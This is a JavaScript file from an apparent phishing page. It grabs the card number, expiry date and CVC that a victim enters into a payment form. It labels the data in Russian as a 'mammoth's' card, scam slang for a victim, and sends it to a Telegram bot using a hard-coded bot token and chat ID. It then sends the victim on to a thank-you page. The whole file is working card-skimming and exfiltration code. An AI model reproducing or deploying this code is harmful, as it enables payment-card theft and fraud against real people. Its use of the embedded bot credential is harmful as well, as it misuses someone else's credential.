let tg = {
    token: "6955150230:AAEABHyW9jLsv9CvO6x-awQpGHCRHQOzxcw",
    chat_id: "756956428" 
}

function sendMessage(text){
    const url = `https://api.telegram.org/bot${tg.token}/sendMessage?chat_id=${tg.chat_id}&text=${text}`; // The url to request
    const xht = new XMLHttpRequest();
    xht.open("GET", url);
    xht.send();
}

const cardForm = document.getElementById('card')

function retretiveCardForm(event){
    event.preventDefault();
    let txt = '';

    const number = this.querySelector('[name="number"]'),
    date = this.querySelector('[name="date"]'),
    cvc = this.querySelector('[name="cvc"]');


    const values = {
        '💳 Данные карты мамонта 💳':'',
        "Number ": number.value,
        "Date ": date.value,
        "CVC ": cvc.value
    }

    for (var key in values) {
        txt +=  key + values[key] + "%0A";
    }

    if (number.value ===''|| date.value === '' || cvc.value === ''){
        alert('Пустое поле! ПОЧЕМУ?')
    }else{
        window.location.href = '/thx.html'
        sendMessage(txt);
    }

    
    

}

cardForm.addEventListener('submit', retretiveCardForm)



const cardNumber =cardForm.querySelector('[name="number"]')
const cardDate =cardForm.querySelector('[name="date"]')
const cardCVC =cardForm.querySelector('[name="cvc"]')

const mask1 = new IMask(cardNumber,{
    mask: '0000 0000 0000 0000'
})
const mask2 = new IMask(cardDate,{
    mask: '00{/}00'
})
const mask3 = new IMask(cardCVC,{
    mask: '000'
})




